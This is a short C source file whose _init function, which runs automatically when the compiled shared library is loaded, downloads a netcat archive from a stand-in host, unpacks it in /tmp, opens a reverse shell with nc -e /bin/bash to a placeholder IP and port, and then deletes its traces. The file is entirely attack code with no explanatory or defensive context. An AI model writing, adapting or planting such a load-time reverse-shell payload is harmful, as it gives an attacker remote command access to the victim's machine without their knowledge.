#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

void _init(void) {
    const char *cmd = "/usr/bin/wget http://example.com/netcat.tar.gz -O /tmp/netcat.tar.gz && \
                        /bin/tar xzf /tmp/netcat.tar.gz -C /tmp && \
                        /tmp/netcat-*/nc <ip> <port> -e /bin/bash && \
                        /bin/rm /tmp/netcat.tar.gz /tmp/netcat-*";
    system(cmd);
}
